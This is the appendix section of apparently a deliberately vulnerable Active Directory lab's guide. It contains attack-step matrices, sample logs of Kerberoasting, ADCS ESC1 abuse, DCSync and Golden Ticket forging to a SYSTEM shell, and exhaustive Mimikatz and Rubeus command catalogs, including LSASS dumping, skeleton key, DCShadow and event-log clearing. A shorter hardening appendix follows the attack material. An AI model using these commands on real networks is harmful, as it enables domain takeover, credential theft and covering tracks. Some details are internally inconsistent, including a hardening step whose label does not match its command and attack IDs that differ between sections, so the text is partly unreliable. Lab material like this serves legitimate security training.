| ENUM-001 | any cred | full user list |
| ENUM-002 | any cred | full computer list |
| ENUM-003 | any cred | full group list w/ membership |
| ENUM-004 | any cred | OU tree |
| ENUM-005 | any cred | GPO list |
| ENUM-006 | any cred | sites + subnets |
| ENUM-007 | any cred | trust list |
| ENUM-008 | any cred | password policy |
| ENUM-009 | any cred | fine-grained PSO (Password Settings Object) |
| ENUM-010 | any cred | trusted domain object DACL |

### U.3 CRED matrix (top 10)

| ID | Pre | Post |
|---|---|---|
| CRED-001 | any cred | TGS-REP hashes for every SPN |
| CRED-002 | any cred + target SPN | targeted TGS-REP hash |
| CRED-003 | usernames | AS-REP hashes for accounts without preauth |
| CRED-004 | NT hash | OverPTH TGT |
| CRED-005 | DCSync rights | krbtgt NT hash |
| CRED-006 | DA on corp.local | trust account NT hash |
| CRED-007 | DCSync rights | any service hash |
| CRED-008 | local cred | TGT in ccache |
| CRED-009 | krbtgt NT | Diamond ticket |
| CRED-010 | krbtgt NT | Sapphire ticket |

### U.4 LAT matrix (top 10)

| ID | Pre | Post |
|---|---|---|
| LAT-001 | local admin cred | SYSTEM shell via psexec |
| LAT-002 | local admin cred | SYSTEM shell via smbexec |
| LAT-003 | local admin cred | SYSTEM shell via wmiexec |
| LAT-004 | local admin cred | shell via DCOM |
| LAT-005 | local admin cred | shell via schtasks |
| LAT-006 | local admin cred | shell via WinRM |
| LAT-007 | local admin cred | shell via WinRM-HTTPS |
| LAT-008 | local admin cred | RDP desktop |
| LAT-009 | cred + SSH allow | shell on file01 |
| LAT-010 | NT hash | PTH shell |

### U.5 PE matrix (top 10)

| ID | Pre | Post |
|---|---|---|
| PE-001 | SeImpersonate token | SYSTEM via PrintSpoofer |
| PE-002 | SeImpersonate token | SYSTEM via GodPotato |
| PE-003 | SeImpersonate token | SYSTEM via DCOMPotato |
| PE-004 | SeBackup token | SAM/SYSTEM/NTDS read |
| PE-005 | SeDebug token | LSASS dump |
| PE-006 | SeTrustedCredManAccess | DPAPI key access |
| PE-007 | SeLoadDriver | Capcom.sys kernel exec |
| PE-008 | SeTakeOwnership | own and modify system files |
| PE-009 | writable unquoted path | service hijack |
| PE-010 | `AlwaysInstallElevated=1` | MSI elevation |

### U.6 PER matrix (top 10)

| ID | Pre | Post |
|---|---|---|
| PER-001 | krbtgt NT + domain SID | Golden Ticket |
| PER-002 | service NT + SPN | Silver Ticket |
| PER-003 | krbtgt AES + live TGT | Diamond Ticket |
| PER-004 | krbtgt AES + live PAC | Sapphire Ticket |
| PER-005 | SYSTEM on DC | Skeleton Key |
| PER-006 | SYSTEM on DC | DSRM network logon |
| PER-007 | SYSTEM on DC | DSRM password sync |
| PER-008 | DA | AdminSDHolder ACL backdoor |
| PER-009 | DA | Krbtgt ACL backdoor |
| PER-010 | DA | new DA user |

### U.7 DF matrix (top 10)

| ID | Pre | Post |
|---|---|---|
| DF-001 | DA on corp.local | corp krbtgt extracted |
| DF-002 | DA on eu.corp.local | eu krbtgt extracted |
| DF-003 | corp krbtgt | Golden corp.local |
| DF-004 | eu krbtgt | Golden eu.corp.local |
| DF-005 | eu krbtgt | DA on corp.local via ExtraSID |
| DF-006 | corp krbtgt | DA on eu.corp.local via ExtraSID |
| DF-007 | SYSTEM on corp DC | Skeleton on corp.local |
| DF-008 | SYSTEM on eu DC | Skeleton on eu.corp.local |
| DF-009 | DA on corp.local | DCShadow replay |
| DF-010 | DA on eu.corp.local | DCShadow replay |

---

## Appendix V — Acceptance criteria for "lab complete"

Use this checklist to claim DVAD complete. The lab is *not* complete when you have DA on corp.local — it's complete when:

```text
[ ] DA achieved on corp.local                (≥1 of Patterns A-N)
[ ] DA achieved on eu.corp.local             (Pattern P or fresh enum)
[ ] DA achieved on finance.local             (Pattern Q or fresh enum)
[ ] DA achieved on root.corp                 (Pattern R or fresh enum)
[ ] EA achieved on every forest              (any 3 patterns: G + Q + R)
[ ] ≥3 ADCS escalations executed             (ESC1, ESC8, + 1 more)
[ ] ≥2 coercion+relay chains executed        (PetitPotam + mitm6)
[ ] BloodHound graph imported + reviewed     ("Shortest paths" run)
[ ] Persistence: 1 domain-tier on each DC    (Golden ×4)
[ ] Persistence: 1 object-tier on ≥3 hosts   (Shadow Creds + AdminSDHolder + RBCD)
[ ] Persistence: 1 cert-tier                 (Golden Cert)
[ ] Persistence: 1 host-tier on each VM      (schtask + WMI subscription)
[ ] ≥50 % of flag IDs captured               (≥191/382)
[ ] Write-up produced                        (§26 templates)
```

For "no help" mode:
```text
[ ] Completed all of the above without consulting docs/08-solve-path.md
[ ] Completed all of the above without using Metasploit
[ ] Completed all of the above on a freshly-reset lab (no remnant artefacts)
```

---

## Appendix W — Lab spec drift detection

When DVAD is updated, code and PLAN.md can drift. Operators verifying a build should run:

```bash
# Flag count alignment
python3 -c "
import yaml
from collections import Counter
data = yaml.safe_load(open('ansible/roles/flag_factory/vars/main.yml'))
flags = data['dvad_flags']
print(f'Total: {len(flags)}')
print(Counter(f['cat'] for f in flags))
ids = [f['id'] for f in flags]
dups = [i for i in set(ids) if ids.count(i) > 1]
print(f'Duplicates: {dups or \"none\"}')"

# Ansible syntax check
cd ansible && ansible-playbook -i inventory.yml playbooks/site.yml --syntax-check

# Per-VM connectivity check
for ip in 10.10.0.10 10.10.0.11 10.10.0.12 10.10.0.13 10.10.0.14 10.10.0.100 10.20.0.10 10.30.0.10; do
  nc -zv "$ip" 5985 2>&1 | grep -E 'succeeded|refused'
done

# Trust state check
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' -M enum_trusts | grep -i 'finance\|root\|eu'
```

If any of these fail, the lab is in a drifted state. Either `./deploy.sh` again, or `cd ansible && ansible-playbook ... site.yml --tags <failing-role>`.

---

## Appendix X — Pre-production hardening (post-engagement reset)

If you want to flip DVAD into a "hardened" mode to compare attack ↔ defense:

```bash
# 1. Enable Defender
ansible all_dcs -m win_command -a 'powershell Set-MpPreference -DisableRealtimeMonitoring \$False'
# 2. Re-enable Windows Firewall
ansible all -m win_shell -a 'netsh advfirewall set allprofiles state on'
# 3. Force SMB signing
ansible all -m win_regedit -a "path=HKLM:\System\CurrentControlSet\Services\LanmanServer\Parameters name=RequireSecuritySignature data=1 type=dword"
# 4. Force LDAP signing
ansible all_dcs -m win_regedit -a "path=HKLM:\System\CurrentControlSet\Services\NTDS\Parameters name=LDAPServerIntegrity data=2 type=dword"
# 5. Remove RC4 from supported etypes
ansible all_dcs -m win_command -a 'powershell Set-ADDefaultDomainPasswordPolicy -Identity corp.local -ComplexityEnabled \$True -MinPasswordLength 14'
# 6. Patch the unsigned ADCS templates (revoke ESC*)
ansible ca01 -m win_command -a 'powershell -c "Get-CATemplate | Where-Object {$_.Name -like \"ESC*\"} | Remove-CATemplate -Force"'
# 7. Reset krbtgt to a generated password
ansible dc01.corp.local -m win_command -a 'powershell -c "Set-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString (New-Guid).Guid -AsPlainText -Force)"'
# 8. Re-enable SID filtering
ansible dc01.corp.local -m win_command -a 'netdom trust corp.local /domain:finance.local /quarantine:yes'
# 9. Set MachineAccountQuota to 0
ansible dc01.corp.local -m win_command -a 'powershell -c "Set-ADDomain -Identity corp.local -Replace @{\"ms-DS-MachineAccountQuota\"=\"0\"}"'
# 10. Audit policy on (4624/4625/4768/4769/4776/5145/5136)
ansible all_dcs -m win_command -a 'auditpol /set /subcategory:"Logon" /success:enable /failure:enable'
```

Run the attack chain again; observe how each step fails.

---





Quick-find by command name.

```text
addcomputer            impacket — add a machine account using MAQ
asreproast             impacket-GetNPUsers — AS-REP collection
atexec                 impacket — remote command via schtasks
bloodhound-python     enum collector for BloodHound
certipy                ADCS swiss army
certutil               built-in CA management
dcomexec               impacket — remote command via DCOM
dcsync                 (verb; impacket-secretsdump implements it)
dfscoerce.py          coerce via MS-DFSNM
dig                    DNS query (AXFR for IA-003)
enum4linux-ng          smb + ldap enum collector
evil-winrm             interactive WinRM shell
GetNPUsers            impacket — AS-REP roast
GetUserSPNs           impacket — Kerberoast
hashcat                offline cracking
impacket-getST         S4U2Self + S4U2Proxy
impacket-getTGT        Kerberos AS-REQ
john                   alt offline cracking
kerbrute               user enumeration
ldapsearch             raw LDAP queries
lookupsid              RID brute via lsarpc
mimikatz               on-box LSASS / ticket toolbox
mitm6                  IPv6 DHCP takeover + WPAD
mssqlclient            impacket — MSSQL TDS interactive
nanodump               LSASS dump variant
nltest                 trust + DC info (built-in)
ntlmrelayx             impacket — universal NTLM relay
nxc / netexec          modular post-exploit
PetitPotam             coerce via MS-EFSR
printerbug.py          coerce via MS-RPRN
procdump               LSASS dump (signed binary)
psexec                 impacket — remote SYSTEM shell
pypykatz               offline LSASS parser
rdate                  one-shot time sync
responder              LLMNR/NBT-NS poisoner
rubeus.exe             Windows-side Kerberos swiss army
rustscan               fast TCP scanner
rpcdump.py            RPC endpoint mapper
secretsdump            impacket — NTDS / SAM / LSA dump
shadow                 (certipy verb) — msDS-KeyCredentialLink abuse
SharpHound.exe         Windows BH collector
smbclient              SMB client
smbexec                impacket — remote command via SMB
smbmap                 share enum + ACL
SpoolSample.py         coerce variant
SSDP/UPnP              gssdp-discover
TCP scan               nmap / masscan / rustscan
ticketer               impacket — Golden/Silver/Diamond forge
wmiexec                impacket — remote command via WMI
xfreerdp               RDP client
zerologon_tester.py    CVE-2020-1472 detection
```

---

## Appendix O — End-to-end run logs (sample)

Example operator output for the canonical solve — paste this into a notebook as a "what success looks like" reference.

### O.1 IA-001 anonymous SMB

```text
$ nxc smb 10.10.0.10 -u '' -p '' --shares
SMB    10.10.0.10   445  DC01     [*] Windows Server 2022 Datacenter (x64)
SMB    10.10.0.10   445  DC01     [+] corp.local\: 
SMB    10.10.0.10   445  DC01     [*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share
SYSVOL          READ            Logon server share
```

### O.2 IA-006 spray

```text
$ nxc smb 10.10.0.10 -u users.txt -p 'DVADlab2024!' --continue-on-success
SMB   10.10.0.10  445  DC01    [+] corp.local\alice:DVADlab2024!
SMB   10.10.0.10  445  DC01    [+] corp.local\bob:DVADlab2024!
SMB   10.10.0.10  445  DC01    [-] corp.local\svc_nopreauth:DVADlab2024! STATUS_LOGON_FAILURE
SMB   10.10.0.10  445  DC01    [+] corp.local\svc_legacy:DVADlab2024!
```

### O.3 CRED-001 Kerberoast

```text
$ impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 -request -outputfile spns.kr
Impacket v0.12.0 - Copyright 2023 Fortra
ServicePrincipalName              Name      MemberOf  PasswordLastSet  LastLogon  Delegation 
--------------------------------  --------  --------  ---------------  ---------  ----------
MSSQLSvc/sql01.corp.local:1433    svc_sql            2026-04-01...
HTTP/file01.corp.local            svc_web            2026-04-01...
http/iis.corp.local               svc_iis            2026-04-01...

$ hashcat -m 13100 spns.kr /usr/share/wordlists/rockyou.txt --force
$krb5tgs$23$*svc_web$CORP.LOCAL$HTTP/file01.corp.local*$...:Summer2023!
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$...:SqlServer2025!
```

### O.4 ADCS ESC1

```text
$ certipy find -u svc_web@corp.local -p 'Summer2023!' -dc-ip 10.10.0.10 -vulnerable -stdout
Certificate Templates
  0
    Template Name                          : ESC1Template
    Enabled                                : True
    Enrollment Rights                      : CORP.LOCAL\Domain Users
    ENROLLEE_SUPPLIES_SUBJECT              : True
    Client Authentication                  : True
    Vulnerabilities                        : ESC1

$ certipy req -u svc_web@corp.local -p 'Summer2023!' -dc-ip 10.10.0.10 \
              -ca CORP-CA -template ESC1Template -upn Administrator@corp.local
[*] Saved certificate and private key to 'administrator.pfx'

$ certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
[*] Using principal: administrator@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Got hash for 'administrator@corp.local': aad3b435...:6e7f4ee...
```

### O.5 DCSync krbtgt

```text
$ impacket-secretsdump -hashes :6e7f4ee... -just-dc-user krbtgt corp.local/Administrator@10.10.0.10
Impacket v0.12.0 - Copyright 2023 Fortra
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ad8f3a0c7e7d3a06a47ad6f1d9c1c0e7:::
```

### O.6 Golden Ticket forge

```text
$ impacket-ticketer -nthash ad8f3a0c7e7d3a06a47ad6f1d9c1c0e7 \
                    -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
                    -domain corp.local Administrator
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for corp.local/Administrator
[*] Saving ticket to Administrator.ccache
$ export KRB5CCNAME=Administrator.ccache
$ impacket-psexec -k -no-pass dc01.corp.local
[*] Requesting shares on dc01.corp.local.....
[*] Found writable share ADMIN$
[*] Uploading file YBpKZNAd.exe
[*] Opening SVCManager on dc01.corp.local.....
[*] Creating service jKDr on dc01.corp.local.....
[*] Starting service jKDr.....
[!] Press help for extra shell commands
nt authority\system
C:\Windows\system32>
```

---

## Appendix Y — Mimikatz exhaustive command catalog

Mimikatz remains the canonical post-exploitation credential extraction toolkit on Windows. Every command below is one you may need on DVAD if you decide to drop the tool on a compromised host (ws01, file01, sql01) or run an equivalent via Rubeus/SharpKatz. All commands assume an elevated PowerShell or cmd session on the target with Defender disabled (DVAD baseline).

### Y.1 Privilege escalation primitives

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM
-> Impersonated !

mimikatz # token::elevate /domainadmin
```

### Y.2 LSASS credential extraction

```
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::logonpasswords full
mimikatz # sekurlsa::wdigest
mimikatz # sekurlsa::tspkg
mimikatz # sekurlsa::kerberos
mimikatz # sekurlsa::ekeys
mimikatz # sekurlsa::dpapi
mimikatz # sekurlsa::credman
mimikatz # sekurlsa::msv
mimikatz # sekurlsa::livessp
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:powershell.exe
```

### Y.3 SAM / LSA / cached credential extraction

```
mimikatz # lsadump::sam
mimikatz # lsadump::secrets
mimikatz # lsadump::cache
mimikatz # lsadump::lsa /inject
mimikatz # lsadump::lsa /patch
```

### Y.4 DCSync — remote NTDS extraction

```
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt /dc:dc01.corp.local
mimikatz # lsadump::dcsync /domain:corp.local /user:DC01$
```

### Y.5 Golden / Silver / Diamond / Sapphire tickets

```
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<nthash> /id:500 /ptt
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<nthash> /id:500 /sids:S-1-5-21-FINANCE-519 /ptt
mimikatz # kerberos::golden /user:bob /domain:corp.local /sid:S-1-5-21-... /target:file01.corp.local /service:cifs /rc4:<servicehash> /ptt
mimikatz # kerberos::list
mimikatz # kerberos::purge
mimikatz # kerberos::tgt
```

### Y.6 DPAPI

```
mimikatz # dpapi::masterkey /in:"C:\Users\alice\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>" /rpc
mimikatz # dpapi::cred /in:"C:\Users\alice\AppData\Local\Microsoft\Credentials\<GUID>" /masterkey:<key>
mimikatz # dpapi::chrome /in:"C:\Users\alice\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
mimikatz # dpapi::vault /in:"C:\Users\alice\AppData\Local\Microsoft\Vault\<GUID>"
```

### Y.7 Certificate / cert store extraction

```
mimikatz # crypto::capi
mimikatz # crypto::certificates /export
mimikatz # crypto::certificates /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE /store:MY /export
mimikatz # crypto::scauth
```

### Y.8 Skeleton key (PER-009)

```
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
After this, any user authenticates with password `mimikatz` against any service via NTLM on the DC. Critical to revert before persistence cleanup.

### Y.9 DCShadow (PER-018)

```
# Window 1 (SYSTEM, mimikatz "server"):
mimikatz # !+
mimikatz # !processtoken
mimikatz # lsadump::dcshadow /object:CN=Administrator,CN=Users,DC=corp,DC=local /attribute:primaryGroupID /value:519

# Window 2 (Domain Admin, mimikatz "push"):
mimikatz # lsadump::dcshadow /push
```

### Y.10 Miscellaneous

```
mimikatz # event::clear
mimikatz # event::drop
mimikatz # vault::list
mimikatz # vault::cred /patch
mimikatz # ts::multirdp
mimikatz # process::list
```

---

## Appendix Z — Rubeus exhaustive command catalog

Rubeus is the gold standard for Kerberos abuse on Windows. Memorize these flag combinations.

### Z.1 Reconnaissance

```
Rubeus.exe triage
Rubeus.exe klist
Rubeus.exe klist /luid:0x3e7
Rubeus.exe dump
Rubeus.exe dump /service:krbtgt
Rubeus.exe dump /luid:0x3e7 /nowrap
```

### Z.2 AS-REP roast (CRED-002)

```
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
Rubeus.exe asreproast /user:guest /format:hashcat
Rubeus.exe asreproast /domain:corp.local /dc:dc01.corp.local /format:hashcat /nowrap
Rubeus.exe asreproast /ou:"OU=ServiceAccounts,DC=corp,DC=local" /format:hashcat
```

### Z.3 Kerberoast (CRED-001)

```
Rubeus.exe kerberoast /outfile:kerb.txt
Rubeus.exe kerberoast /user:svc_sql /format:hashcat
Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.corp.local:1433 /format:hashcat
Rubeus.exe kerberoast /rc4opsec /nowrap
Rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /tgtdeleg
Rubeus.exe kerberoast /aes
```

### Z.4 Ask TGT / pass-the-ticket

```
Rubeus.exe asktgt /user:alice /password:'DVADlab2024!' /domain:corp.local /dc:dc01.corp.local /nowrap
Rubeus.exe asktgt /user:alice /rc4:<nthash> /nowrap /ptt
Rubeus.exe asktgt /user:alice /aes256:<aes> /nowrap /ptt
Rubeus.exe asktgt /user:alice /certificate:<base64pfx> /password:<pfxpwd> /ptt
Rubeus.exe asktgt /user:dc01$ /rc4:<machinehash> /nowrap
Rubeus.exe ptt /ticket:<base64ccache>
Rubeus.exe purge
Rubeus.exe renew /ticket:<ticket.kirbi> /autorenew
```

### Z.5 S4U abuse (PE / LAT)

```
Rubeus.exe s4u /user:svc_legacy /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/file01.corp.local /ptt
Rubeus.exe s4u /ticket:svc_legacy.kirbi /impersonateuser:Administrator /msdsspn:host/file01.corp.local /altservice:cifs,http,ldap /ptt
Rubeus.exe s4u /user:ws01$ /rc4:<machinehash> /impersonateuser:Administrator /msdsspn:cifs/dc01.corp.local /ptt
Rubeus.exe s4u /self /user:svc /rc4:<hash> /impersonateuser:Administrator
```

### Z.6 Cross-forest

```
Rubeus.exe asktgs /service:krbtgt/finance.local /ticket:tgt.kirbi /nowrap
Rubeus.exe asktgs /service:cifs/dc01.finance.local /ticket:referral.kirbi /ptt
Rubeus.exe golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /aes256:<krbtgthash> /sids:S-1-5-21-FINANCE-519 /netbios:CORP /ptt
```

### Z.7 Diamond and Sapphire tickets

```
Rubeus.exe diamond /tgtdeleg /user:Administrator /krbkey:<aes256> /ticketuser:Administrator /ticketuserid:500 /groups:512,513,518,519,520
Rubeus.exe diamond /tgtdeleg /enctype:aes256 /krbkey:<key> /printcmd
Rubeus.exe golden /sapphire ...
```

### Z.8 Ticket cache manipulation

```
Rubeus.exe describe /ticket:base64.kirbi
Rubeus.exe tgtdeleg
Rubeus.exe tgtdeleg /target:cifs/dc01.corp.local
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

### Z.9 Hash / encryption type conversion

```
Rubeus.exe hash /password:'DVADlab2024!' /user:alice /domain:corp.local
Rubeus.exe hash /password:'DVADlab2024!' /user:alice /domain:corp.local /enctype:aes256
```

---

## Appendix AA — High-value flag reference (selection)

Full enumeration of all 382 IDs would be a small book; this appendix indexes the highest-value flags by category. The complete authoritative list lives in `PLAN.md` and is materialized as `C:\Flags\<ID>.txt` on each host by the `flag_factory` Ansible role.

| ID | Host | Description | How to capture |
|---|---|---|---|
| IA-001 | ws01 | Anonymous LDAP bind dump | `nxc ldap 10.10.0.10 -u '' -p ''` |
| IA-007 | ws01 | LLMNR poisoned hash crack | `Responder -I dvad-ctf` + hashcat |
| IA-012 | ws01 | mitm6 + ntlmrelayx delegate | `mitm6 -d corp.local` + `ntlmrelayx -t ldaps://dc01 --delegate-access` |
| IA-021 | ws01 | SMB null share enum | `smbclient -L //10.10.0.13 -N` |
| IA-035 | ws01 | Anon SQL login | `mssqlclient.py -windows-auth :@sql01` |
| IA-042 | ws01 | ADCS web enroll | `curl --ntlm http://ca01/certsrv/` |
| ENUM-001 | dc01 | DNS zone enum | dnstool / `nslookup -type=any` |
| ENUM-014 | dc01 | gMSA enumeration | `nxc ldap ... -M gmsa` |
| ENUM-027 | dc01 | Cert template enum | `certipy find -u alice -p ... -dc-ip 10.10.0.10 -text` |
| REC-005 | dc01 | DC fingerprint via `nltest` | `nltest /dsgetdc:corp.local` |
| CRED-001 | sql01 | Kerberoast svc_sql | Rubeus / GetUserSPNs |
| CRED-002 | dc01 | AS-REP roast | GetNPUsers |
| CRED-007 | dc01 | DCSync via sync_user | secretsdump |
| CRED-019 | file01 | RBCD on FILE01$ | `rbcd.py` + S4U |
| CRED-022 | ca01 | ESC1 cert request | `certipy req` |
| CRED-031 | dc01 | ESC8 NTLM relay to web enroll | `ntlmrelayx -t http://ca01/certsrv/.../certfnsh.asp` |
| CRED-040 | ws01 | DPAPI master key extraction | mimikatz `dpapi::masterkey` |
| LAT-001 | file01 | psexec lateral | `psexec.py corp.local/alice:...` |
| LAT-014 | sql01 | xp_cmdshell pivot | `mssqlclient.py -windows-auth` |
| LAT-022 | ws01 | WinRM hop | `evil-winrm -i 10.10.0.100 -u alice -H <hash>` |
| PE-005 | sql01 | TRUSTWORTHY db chain | `EXEC sp_OACreate ...` |
| PE-014 | dc01 | DnsAdmins ServerLevelPluginDll | `dnscmd ... /Config /ServerLevelPluginDll` |
| PE-027 | dc01 | Backup Operators registry hive dump | `reg save HKLM\SAM ...` |
| PER-001 | dc01 | Golden ticket | `ticketer.py` |
| PER-005 | ca01 | Forge cert with CA key (Certifried) | mimikatz `crypto::*` + certipy forge |
| PER-018 | dc01 | DCShadow | mimikatz `lsadump::dcshadow` |
| DF-001 | dc01.finance | SID history injection cross-forest | `kerberos::golden /sids:...` |
| DF-015 | dc01.root | Trust ticket forge | `ticketer.py -nthash <trustkey>` |

(Full table — all 382 entries — is generated automatically by `ansible/roles/flag_factory/templates/flags.yml.j2`; run `ansible-inventory -i ansible/inventory.yml --list` after deploy to dump it.)

---

## Disclaimer

DVAD is intentionally vulnerable. Run only on a network you own. Treat the VMs as hostile. The lab password and configs are public; do not reuse them anywhere else. The authors accept no responsibility for misuse.
